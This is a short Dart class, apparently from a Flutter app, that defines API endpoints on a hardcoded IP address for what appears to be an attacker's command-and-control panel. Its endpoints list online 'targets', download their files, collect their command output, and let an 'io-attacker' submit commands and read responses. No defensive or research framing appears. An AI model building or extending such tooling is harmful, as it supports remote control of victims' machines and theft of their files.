class AppUrl{

  static const baseUrl = 'http://35.200.173.112';
  //user
  static const userApi = '$baseUrl/users/';
  //target
  static const targetApi = '$baseUrl/target/';
  static const getAllTargetsApi = '$baseUrl/target/all';
  static const getAllTargetFilesApi = '$baseUrl/target/files';
  static const getOnlineTargetsApi = '$baseUrl/target/online';
  static const targetFileDownloadApi = '$baseUrl/target/file/download';
  //io-target
  static const receiveCommandResponseApi = '$baseUrl/io-target/commands/response';
  static const receiveFileCommandResponseApi = '$baseUrl/io-target/commands/file-response';
  //io-attacker
  static const submitCommandApi = '$baseUrl/io-attacker/submit-command/';
  static const checkResponseAvailabilityApi = '$baseUrl/io-attacker/response/available/';
  static const getCommandResponseApi = '$baseUrl/io-attacker/response/';

}